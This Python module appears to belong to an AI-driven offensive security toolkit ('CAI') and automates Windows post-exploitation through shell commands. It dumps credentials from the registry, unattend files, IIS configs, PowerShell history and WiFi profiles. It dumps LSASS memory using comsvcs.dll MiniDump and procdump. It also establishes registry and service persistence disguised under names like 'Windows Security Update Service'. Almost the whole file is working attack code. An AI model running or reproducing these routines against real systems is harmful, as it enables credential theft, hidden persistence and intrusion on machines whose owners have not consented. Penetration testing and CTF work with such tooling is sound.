"""
Windows Exploitation and Post-Exploitation Toolkit for CAI

This module provides comprehensive Windows exploitation tools including
credential dumping, registry manipulation, Windows service attacks, and post-exploitation techniques.
"""

import os
import re
import time
import json
import base64
import subprocess
from typing import Dict, List, Tuple, Optional, Any
from cai.tools.common import run_command


def automated_windows_postexploit(ctf=None, **kwargs) -> str:
    """
    Perform comprehensive Windows post-exploitation assessment
    
    Returns:
        str: Detailed Windows post-exploitation results
    """
    results = []
    results.append("=== Windows Post-Exploitation Assessment ===")
    results.append(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    results.append("")

    try:
        # 1. System Information Gathering
        results.append("=== Windows System Information ===")
        sys_info = gather_windows_system_info(ctf=ctf)
        results.append(sys_info)
        results.append("")

        # 2. User and Privilege Analysis
        results.append("=== User and Privilege Analysis ===")
        user_analysis = analyze_windows_users_privileges(ctf=ctf)
        results.append(user_analysis)
        results.append("")

        # 3. Credential Dumping
        results.append("=== Credential Dumping ===")
        cred_dump = dump_windows_credentials(ctf=ctf)
        results.append(cred_dump)
        results.append("")

        # 4. Registry Analysis
        results.append("=== Registry Analysis ===")
        registry_analysis = analyze_windows_registry(ctf=ctf)
        results.append(registry_analysis)
        results.append("")

        # 5. Service Analysis
        results.append("=== Windows Service Analysis ===")
        service_analysis = analyze_windows_services(ctf=ctf)
        results.append(service_analysis)
        results.append("")

        # 6. Network Analysis
        results.append("=== Network Analysis ===")
        network_analysis = analyze_windows_network(ctf=ctf)
        results.append(network_analysis)
        results.append("")

        # 7. Persistence Opportunities
        results.append("=== Persistence Opportunities ===")
        persistence_analysis = analyze_persistence_opportunities(ctf=ctf)
        results.append(persistence_analysis)
        results.append("")

        return "\n".join(results)

    except Exception as e:
        return f"Error during Windows post-exploitation: {str(e)}"


def gather_windows_system_info(ctf=None, **kwargs) -> str:
    """Gather comprehensive Windows system information"""
    results = []

    try:
        # Basic system information
        system_commands = [
            ("Computer Name", "hostname"),
            ("OS Version", "ver"),
            ("System Info", "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\""),
            ("Current User", "whoami"),
            ("User Privileges", "whoami /priv"),
            ("User Groups", "whoami /groups"),
            ("Domain Info", "echo %USERDOMAIN%"),
            ("Architecture", "wmic os get osarchitecture /value"),
            ("Installed Hotfixes", "wmic qfe list brief /format:table"),
        ]

        for info_name, command in system_commands:
            try:
                info_result = run_command(command, ctf=ctf)
                if info_result.strip():
                    results.append(f"{info_name}:")
                    results.append(info_result)
                    results.append("")
            except Exception as e:
                results.append(f"Error getting {info_name}: {str(e)}")

        # Check if we're in a domain environment
        domain_check = run_command("echo %LOGONSERVER%", ctf=ctf)
        if domain_check.strip() and domain_check.strip() != "%LOGONSERVER%":
            results.append(f"ðŸ¢ Domain Environment Detected!")
            results.append(f"Logon Server: {domain_check.strip()}")

            # Get additional domain info
            domain_info = run_command("nltest /domain_trusts 2>nul", ctf=ctf)
            if domain_info.strip():
                results.append(f"Domain Trusts:\n{domain_info}")

        # Check for virtualization
        vm_check = run_command("wmic computersystem get model,manufacturer /format:list", ctf=ctf)
        if any(vm_indicator in vm_check.lower() for vm_indicator in ['vmware', 'virtualbox', 'virtual', 'qemu']):
            results.append("ðŸ–¥ï¸ Virtual Machine Detected")

    except Exception as e:
        results.append(f"Error gathering Windows system info: {str(e)}")

    return "\n".join(results)


def analyze_windows_users_privileges(ctf=None, **kwargs) -> str:
    """Analyze Windows users and their privileges"""
    results = []

    try:
        # Current user privileges
        privileges = run_command("whoami /priv", ctf=ctf)
        results.append("Current User Privileges:")
        results.append(privileges)

        # Check for high-value privileges
        high_value_privs = [
            "SeDebugPrivilege", "SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
            "SeTcbPrivilege", "SeBackupPrivilege", "SeRestorePrivilege",
            "SeLoadDriverPrivilege", "SeTakeOwnershipPrivilege"
        ]

        for priv in high_value_privs:
            if priv.lower() in privileges.lower():
                results.append(f"ðŸ”¥ HIGH-VALUE PRIVILEGE: {priv}")

        # Local users
        local_users = run_command("net user", ctf=ctf)
        results.append(f"\nLocal Users:\n{local_users}")

        # Administrators group
        admin_group = run_command("net localgroup administrators", ctf=ctf)
        results.append(f"\nAdministrators Group:\n{admin_group}")

        # Check for cached domain credentials
        cached_creds = run_command("cmdkey /list", ctf=ctf)
        if cached_creds.strip():
            results.append(f"\nðŸ”‘ Cached Credentials:\n{cached_creds}")

        # Recent login information
        recent_logins = run_command("quser 2>nul || query user 2>nul", ctf=ctf)
        if recent_logins.strip():
            results.append(f"\nActive User Sessions:\n{recent_logins}")

        # Check for auto-login
        autologin_check = run_command(
            "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon 2>nul",
            ctf=ctf)
        if "0x1" in autologin_check:
            results.append("\nðŸ”¥ AUTO-LOGIN ENABLED!")
            # Try to get the password
            autologin_pass = run_command(
                "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>nul",
                ctf=ctf)
            if autologin_pass.strip():
                results.append(f"Auto-login password may be stored in registry:\n{autologin_pass}")

    except Exception as e:
        results.append(f"Error analyzing users/privileges: {str(e)}")

    return "\n".join(results)


def dump_windows_credentials(ctf=None, **kwargs) -> str:
    """Attempt to dump Windows credentials using various methods"""
    results = []

    try:
        results.append("Attempting credential extraction...")

        # 1. Check for stored passwords in registry
        results.append("\n=== Registry Password Search ===")
        reg_locations = [
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities",
            "HKLM\\SOFTWARE\\RealVNC\\WinVNC4\\password"
        ]

        for location in reg_locations:
            reg_search = run_command(f"reg query \"{location}\" 2>nul", ctf=ctf)
            if reg_search.strip() and "error" not in reg_search.lower():
                # Look for password-like entries
                if any(keyword in reg_search.lower() for keyword in ['password', 'passwd', 'pwd']):
                    results.append(f"ðŸ”‘ Potential passwords in: {location}")
                    results.append(reg_search[:300])  # Limit output

        # 2. Windows Credential Manager
        results.append("\n=== Windows Credential Manager ===")
        cred_manager = run_command("cmdkey /list", ctf=ctf)
        if cred_manager.strip():
            results.append("Stored credentials found:")
            results.append(cred_manager)

        # 3. Unattended installation files
        results.append("\n=== Unattended Installation Files ===")
        unattend_locations = [
            "C:\\Windows\\Panther\\Unattend.xml",
            "C:\\Windows\\Panther\\Unattended.xml",
            "C:\\Windows\\system32\\sysprep\\unattend.xml",
            "C:\\Windows\\system32\\sysprep\\sysprep.xml"
        ]

        for location in unattend_locations:
            unattend_check = run_command(f"type \"{location}\" 2>nul", ctf=ctf)
            if unattend_check.strip() and "cannot find" not in unattend_check.lower():
                if "password" in unattend_check.lower():
                    results.append(f"ðŸ”¥ Unattended install file with passwords: {location}")
                    # Extract password entries
                    password_lines = [line for line in unattend_check.split('\n') if 'password' in line.lower()]
                    for line in password_lines[:5]:  # Show first 5 matches
                        results.append(f"  {line.strip()}")

        # 4. IIS Configuration Files
        results.append("\n=== IIS Configuration Files ===")
        iis_configs = [
            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"
        ]

        for config in iis_configs:
            iis_check = run_command(f"findstr /S /I \"connectionString\\|password\\|pwd\" \"{config}\" 2>nul", ctf=ctf)
            if iis_check.strip():
                results.append(f"ðŸŒ IIS config with credentials: {config}")
                results.append(iis_check[:200])

        # 5. PowerShell History
        results.append("\n=== PowerShell History ===")
        ps_history_locations = [
            "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
        ]

        for history_file in ps_history_locations:
            history_check = run_command(f"findstr /I \"password\\|passwd\\|pwd\\|credential\" \"{history_file}\" 2>nul",
                                        ctf=ctf)
            if history_check.strip():
                results.append(f"ðŸ”¥ PowerShell history with credentials:")
                results.append(history_check[:300])

        # 6. Browser Stored Passwords (if tools available)
        results.append("\n=== Browser Credential Stores ===")
        browser_paths = [
            "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
            "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        ]

        for browser_path in browser_paths:
            browser_check = run_command(f"dir \"{browser_path}\" 2>nul", ctf=ctf)
            if browser_check.strip() and "file not found" not in browser_check.lower():
                results.append(f"ðŸŒ Browser credential store found: {browser_path}")

        # 7. WiFi Passwords
        results.append("\n=== WiFi Passwords ===")
        wifi_profiles = run_command("netsh wlan show profiles", ctf=ctf)
        if wifi_profiles.strip():
            # Extract profile names
            profile_lines = [line for line in wifi_profiles.split('\n') if 'All User Profile' in line]
            for line in profile_lines[:5]:  # Check first 5 profiles
                profile_name = line.split(':')[-1].strip()
                if profile_name:
                    wifi_key = run_command(f"netsh wlan show profile \"{profile_name}\" key=clear", ctf=ctf)
                    if "Key Content" in wifi_key:
                        results.append(f"ðŸ”‘ WiFi Password for {profile_name}:")
                        key_line = [l for l in wifi_key.split('\n') if 'Key Content' in l]
                        if key_line:
                            results.append(f"  {key_line[0].strip()}")

    except Exception as e:
        results.append(f"Error during credential dumping: {str(e)}")

    return "\n".join(results)


def analyze_windows_registry(ctf=None, **kwargs) -> str:
    """Analyze Windows registry for security misconfigurations"""
    results = []

    try:
        results.append("Analyzing Windows Registry for security issues...")

        # 1. AutoRun entries
        results.append("\n=== AutoRun Analysis ===")
        autorun_keys = [
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
        ]

        for key in autorun_keys:
            autorun_entries = run_command(f"reg query \"{key}\" 2>nul", ctf=ctf)
            if autorun_entries.strip() and "error" not in autorun_entries.lower():
                results.append(f"AutoRun entries in {key}:")
                results.append(autorun_entries)
                results.append("")

        # 2. Installed Software
        results.append("\n=== Installed Software ===")
        installed_software = run_command(
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall 2>nul", ctf=ctf)
        if installed_software.strip():
            # Count installed programs
            program_count = len([line for line in installed_software.split('\n') if 'HKEY_' in line])
            results.append(f"Approximately {program_count} installed programs found")

            # Look for interesting software
            interesting_software = ['vnc', 'teamviewer', 'putty', 'winscp', 'filezilla']
            for software in interesting_software:
                if software.lower() in installed_software.lower():
                    results.append(f"ðŸ” Interesting software found: {software}")

        # 3. Windows Defender Status
        results.append("\n=== Windows Defender Status ===")
        defender_status = run_command(
            "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring 2>nul",
            ctf=ctf)
        if "0x1" in defender_status:
            results.append("ðŸ”¥ Windows Defender Real-time Protection is DISABLED!")
        elif defender_status.strip():
            results.append("Windows Defender Real-time Protection appears to be enabled")

        # 4. UAC Settings
        results.append("\n=== UAC Settings ===")
        uac_setting = run_command(
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA 2>nul",
            ctf=ctf)
        if "0x0" in uac_setting:
            results.append("ðŸ”¥ UAC is DISABLED!")
        elif uac_setting.strip():
            results.append("UAC appears to be enabled")

        # 5. Terminal Server Settings
        results.append("\n=== Remote Desktop Settings ===")
        rdp_setting = run_command(
            "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections 2>nul",
            ctf=ctf)
        if "0x0" in rdp_setting:
            results.append("ðŸŒ Remote Desktop is ENABLED")
            # Check RDP port
            rdp_port = run_command(
                "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber 2>nul",
                ctf=ctf)
            if rdp_port.strip():
                results.append(f"RDP Port configuration:\n{rdp_port}")

        # 6. SNMP Community Strings
        results.append("\n=== SNMP Configuration ===")
        snmp_communities = run_command(
            "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities 2>nul", ctf=ctf)
        if snmp_communities.strip() and "error" not in snmp_communities.lower():
            results.append("ðŸ”¥ SNMP Community Strings found:")
            results.append(snmp_communities)

    except Exception as e:
        results.append(f"Error analyzing registry: {str(e)}")

    return "\n".join(results)


def analyze_windows_services(ctf=None, **kwargs) -> str:
    """Analyze Windows services for privilege escalation opportunities"""
    results = []

    try:
        results.append("Analyzing Windows Services...")

        # 1. Get all services
        services = run_command("sc query state= all", ctf=ctf)
        results.append(f"Total services enumerated")

        # 2. Look for unquoted service paths
        results.append("\n=== Unquoted Service Path Analysis ===")
        unquoted_services = run_command(
            "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"",
            ctf=ctf)
        if unquoted_services.strip():
            results.append("ðŸ”¥ Potentially vulnerable unquoted service paths:")
            results.append(unquoted_services)

        # 3. Services running as SYSTEM
        results.append("\n=== Services Running as SYSTEM ===")
        system_services = run_command("wmic service where StartName=\"LocalSystem\" get Name,State,PathName", ctf=ctf)
        if system_services.strip():
            # Count running SYSTEM services
            running_system = len([line for line in system_services.split('\n') if 'Running' in line])
            results.append(f"Found {running_system} services running as SYSTEM")

        # 4. Modifiable services
        results.append("\n=== Service Permissions Analysis ===")
        # Check if we can modify service configurations
        modifiable_services = []
        common_services = ['Spooler', 'BITS', 'Themes', 'AudioSrv']

        for service in common_services:
            service_check = run_command(f"sc sdshow {service} 2>nul", ctf=ctf)
            if service_check.strip() and "OpenService FAILED" not in service_check:
                # Simple check for write permissions (this is basic)
                if "WD" in service_check or "WO" in service_check:
                    modifiable_services.append(service)

        if modifiable_services:
            results.append(f"ðŸ”¥ Potentially modifiable services: {', '.join(modifiable_services)}")

        # 5. Service binary permissions
        results.append("\n=== Service Binary Permissions ===")
        # Check permissions on service executables
        service_binaries = run_command(
            "wmic service get pathname | findstr /i /v \"system32\" | findstr /i /v \"\"\"\"", ctf=ctf)
        if service_binaries.strip():
            results.append("Non-system32 service binaries found - check permissions manually:")
            for line in service_binaries.split('\n')[:10]:  # First 10
                if line.strip() and 'PathName' not in line:
                    results.append(f"  {line.strip()}")

        # 6. Interesting services
        results.append("\n=== Interesting Services ===")
        interesting_services = ['TeamViewer', 'VNC', 'RDP', 'SSH', 'FTP', 'Telnet']
        for interesting in interesting_services:
            service_search = run_command(f"sc query | findstr /i {interesting}", ctf=ctf)
            if service_search.strip():
                results.append(f"ðŸ” {interesting}-related service found:")
                results.append(service_search)

    except Exception as e:
        results.append(f"Error analyzing services: {str(e)}")

    return "\n".join(results)


def analyze_windows_network(ctf=None, **kwargs) -> str:
    """Analyze Windows network configuration and connections"""
    results = []

    try:
        results.append("Analyzing Windows Network Configuration...")

        # 1. Network interfaces
        results.append("\n=== Network Interfaces ===")
        interfaces = run_command("ipconfig /all", ctf=ctf)
        results.append(interfaces)

        # 2. Active connections
        results.append("\n=== Active Network Connections ===")
        connections = run_command("netstat -ano", ctf=ctf)
        if connections.strip():
            # Look for interesting connections
            listening_ports = [line for line in connections.split('\n') if 'LISTENING' in line]
            results.append(f"Found {len(listening_ports)} listening ports")

            # Check for uncommon listening ports
            common_ports = ['80', '443', '135', '445', '139', '22', '21', '25', '53']
            interesting_ports = []
            for line in listening_ports:
                port_match = re.search(r':(\d+)\s', line)
                if port_match:
                    port = port_match.group(1)
                    if port not in common_ports and int(port) > 1024:
                        interesting_ports.append(port)

            if interesting_ports:
                results.append(f"ðŸ” Interesting listening ports: {', '.join(set(interesting_ports[:10]))}")

        # 3. Routing table
        results.append("\n=== Routing Table ===")
        routes = run_command("route print", ctf=ctf)
        if routes.strip():
            # Look for multiple networks (potential pivoting)
            network_lines = [line for line in routes.split('\n') if re.match(r'\s*\d+\.\d+\.\d+\.\d+', line)]
            if len(network_lines) > 5:  # More than typical default routes
                results.append("ðŸ”¥ Multiple network routes detected - potential pivoting opportunity")

        # 4. ARP table
        results.append("\n=== ARP Table ===")
        arp_table = run_command("arp -a", ctf=ctf)
        if arp_table.strip():
            arp_entries = len([line for line in arp_table.split('\n') if re.match(r'\s*\d+\.\d+\.\d+\.\d+', line)])
            results.append(f"ARP table contains {arp_entries} entries")

        # 5. DNS cache
        results.append("\n=== DNS Cache ===")
        dns_cache = run_command("ipconfig /displaydns | findstr \"Record Name\" | findstr /v \"localhost\"", ctf=ctf)
        if dns_cache.strip():
            dns_entries = len(dns_cache.split('\n'))
            results.append(f"DNS cache contains {dns_entries} non-localhost entries")
            # Look for interesting domains
            if any(domain in dns_cache.lower() for domain in ['admin', 'mail', 'ftp', 'sql', 'db']):
                results.append("ðŸ” Interesting domains found in DNS cache")

        # 6. Windows Firewall Status
        results.append("\n=== Windows Firewall Status ===")
        firewall_status = run_command("netsh advfirewall show allprofiles state", ctf=ctf)
        if firewall_status.strip():
            if "OFF" in firewall_status:
                results.append("ðŸ”¥ Windows Firewall is DISABLED on some profiles!")
            results.append(firewall_status)

        # 7. Network shares
        results.append("\n=== Network Shares ===")
        net_shares = run_command("net share", ctf=ctf)
        if net_shares.strip():
            results.append("Available network shares:")
            results.append(net_shares)

    except Exception as e:
        results.append(f"Error analyzing network: {str(e)}")

    return "\n".join(results)


def analyze_persistence_opportunities(ctf=None, **kwargs) -> str:
    """Analyze opportunities for maintaining persistence"""
    results = []

    try:
        results.append("Analyzing Persistence Opportunities...")

        # 1. Startup folders
        results.append("\n=== Startup Folders ===")
        startup_locations = [
            "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        ]

        for location in startup_locations:
            startup_check = run_command(f"dir \"{location}\" 2>nul", ctf=ctf)
            if startup_check.strip() and "file not found" not in startup_check.lower():
                results.append(f"âœ“ Startup folder accessible: {location}")

        # 2. Scheduled tasks
        results.append("\n=== Scheduled Tasks Analysis ===")
        tasks = run_command("schtasks /query /fo LIST | findstr /i \"taskname\\|next run time\\|status\"", ctf=ctf)
        if tasks.strip():
            task_count = len([line for line in tasks.split('\n') if 'TaskName' in line])
            results.append(f"Found {task_count} scheduled tasks")

            # Check if we can create scheduled tasks
            task_create_test = run_command(
                "schtasks /create /tn \"test_task_delete_me\" /tr \"cmd.exe\" /sc once /st 23:59 2>nul && schtasks /delete /tn \"test_task_delete_me\" /f 2>nul",
                ctf=ctf)
            if "SUCCESS" in task_create_test:
                results.append("ðŸ”¥ Can create scheduled tasks for persistence!")

        # 3. Services
        results.append("\n=== Service Creation Capability ===")
        # Test if we can create services
        service_test = run_command(
            "sc create test_service_delete_me binPath= \"cmd.exe\" 2>nul && sc delete test_service_delete_me 2>nul",
            ctf=ctf)
        if "SUCCESS" in service_test:
            results.append("ðŸ”¥ Can create Windows services for persistence!")

        # 4. WMI Event Subscriptions
        results.append("\n=== WMI Persistence Check ===")
        wmi_subs = run_command("wmic /namespace:\\\\root\\subscription path __EventFilter get Name,Query 2>nul",
                               ctf=ctf)
        if wmi_subs.strip() and "No Instance" not in wmi_subs:
            results.append("Existing WMI event subscriptions found:")
            results.append(wmi_subs[:300])

        # 5. Registry persistence locations
        results.append("\n=== Registry Persistence Locations ===")
        reg_persistence_keys = [
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        ]

        for key in reg_persistence_keys:
            reg_test = run_command(
                f"reg add \"{key}\" /v test_entry /d \"cmd.exe\" /f 2>nul && reg delete \"{key}\" /v test_entry /f 2>nul",
                ctf=ctf)
            if "operation completed successfully" in reg_test.lower():
                results.append(f"âœ“ Can write to registry key: {key}")

        # 6. Logon scripts
        results.append("\n=== Logon Script Opportunities ===")
        logon_script_check = run_command("reg query \"HKCU\\Environment\" /v UserInitMprLogonScript 2>nul", ctf=ctf)
        if "REG_SZ" in logon_script_check:
            results.append("User logon script capability detected")

        # 7. DLL Hijacking opportunities
        results.append("\n=== DLL Hijacking Opportunities ===")
        system_path = run_command("echo %PATH%", ctf=ctf)
        if system_path.strip():
            writable_paths = []
            for path in system_path.split(';'):
                if path.strip():
                    # Test if path is writable (basic check)
                    write_test = run_command(
                        f"echo test > \"{path.strip()}\\test_write.tmp\" 2>nul && del \"{path.strip()}\\test_write.tmp\" 2>nul",
                        ctf=ctf)
                    if not write_test.strip():  # No error output means success
                        writable_paths.append(path.strip())

            if writable_paths:
                results.append(f"ðŸ”¥ Writable directories in PATH (DLL hijacking): {len(writable_paths)} found")

    except Exception as e:
        results.append(f"Error analyzing persistence: {str(e)}")

    return "\n".join(results)


def establish_persistence_registry(command: str, name: str = "SecurityUpdate", ctf=None, **kwargs) -> str:
    """Establish persistence via registry autorun"""
    results = []

    try:
        results.append(f"Establishing registry persistence with name: {name}")

        # Try HKCU first (less privileged)
        hkcu_result = run_command(
            f"reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{name}\" /d \"{command}\" /f",
            ctf=ctf)
        if "operation completed successfully" in hkcu_result.lower():
            results.append("âœ“ Registry persistence established in HKCU")
            results.append(f"Command: {command}")

            # Verify it was added
            verify = run_command(f"reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{name}\"",
                                 ctf=ctf)
            if name in verify:
                results.append("âœ“ Persistence verified in registry")
        else:
            results.append("âš  Failed to establish HKCU persistence")

        # Try HKLM if we have privileges
        hklm_result = run_command(
            f"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{name}\" /d \"{command}\" /f",
            ctf=ctf)
        if "operation completed successfully" in hklm_result.lower():
            results.append("ðŸ”¥ System-wide registry persistence established in HKLM!")

    except Exception as e:
        results.append(f"Error establishing registry persistence: {str(e)}")

    return "\n".join(results)


def establish_persistence_service(command: str, service_name: str = "SecurityUpdateSvc", ctf=None, **kwargs) -> str:
    """Establish persistence via Windows service"""
    results = []

    try:
        results.append(f"Creating Windows service for persistence: {service_name}")

        # Create the service
        create_result = run_command(f"sc create {service_name} binPath= \"{command}\" start= auto", ctf=ctf)
        if "SUCCESS" in create_result:
            results.append("âœ“ Windows service created successfully")

            # Try to start the service
            start_result = run_command(f"sc start {service_name}", ctf=ctf)
            if "START_PENDING" in start_result or "RUNNING" in start_result:
                results.append("âœ“ Service started successfully")
            else:
                results.append("âš  Service created but failed to start")

            # Set description to appear legitimate
            desc_result = run_command(f"sc description {service_name} \"Windows Security Update Service\"", ctf=ctf)
            if "SUCCESS" in desc_result:
                results.append("âœ“ Service description set")
        else:
            results.append("âš  Failed to create Windows service")
            results.append(create_result)

    except Exception as e:
        results.append(f"Error establishing service persistence: {str(e)}")

    return "\n".join(results)


def dump_lsass_memory(ctf=None, **kwargs) -> str:
    """Attempt to dump LSASS process memory for credential extraction"""
    results = []

    try:
        results.append("Attempting to dump LSASS process memory...")

        # First, check our privileges
        privs = run_command("whoami /priv", ctf=ctf)
        if "SeDebugPrivilege" not in privs:
            results.append("âš  SeDebugPrivilege not available - LSASS dump may fail")
        else:
            results.append("âœ“ SeDebugPrivilege available")

        # Get LSASS process ID
        lsass_pid = run_command("tasklist | findstr lsass.exe", ctf=ctf)
        if lsass_pid.strip():
            pid_match = re.search(r'lsass\.exe\s+(\d+)', lsass_pid)
            if pid_match:
                pid = pid_match.group(1)
                results.append(f"LSASS PID: {pid}")

                # Try multiple methods to dump LSASS
                # Method 1: Using built-in tools
                dump_methods = [
                    f"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump {pid} C:\\temp\\lsass.dmp full",
                    f"procdump.exe -accepteula -ma {pid} C:\\temp\\lsass.dmp 2>nul",
                    f"taskmgr.exe /dump {pid} C:\\temp\\lsass.dmp 2>nul"
                ]

                for method in dump_methods:
                    results.append(f"\nTrying: {method}")
                    dump_result = run_command(method, ctf=ctf)

                    # Check if dump was created
                    dump_check = run_command("dir C:\\temp\\lsass.dmp 2>nul", ctf=ctf)
                    if dump_check.strip() and "File Not Found" not in dump_check:
                        results.append("ðŸ”¥ LSASS dump created successfully!")
                        results.append("Use mimikatz or pypykatz to extract credentials from dump")
                        break
                    else:
                        results.append("Dump method failed")
            else:
                results.append("Could not extract LSASS PID")
        else:
            results.append("LSASS process not found")

        # Alternative: Try to access LSASS directly
        results.append("\n=== Alternative: Process Memory Access ===")
        lsass_access = run_command(f"powershell \"Get-Process lsass | Select-Object ProcessName,Id,WorkingSet\"",
                                   ctf=ctf)
        if lsass_access.strip():
            results.append("LSASS process information:")
            results.append(lsass_access)

    except Exception as e:
        results.append(f"Error dumping LSASS: {str(e)}")

    return "\n".join(results)
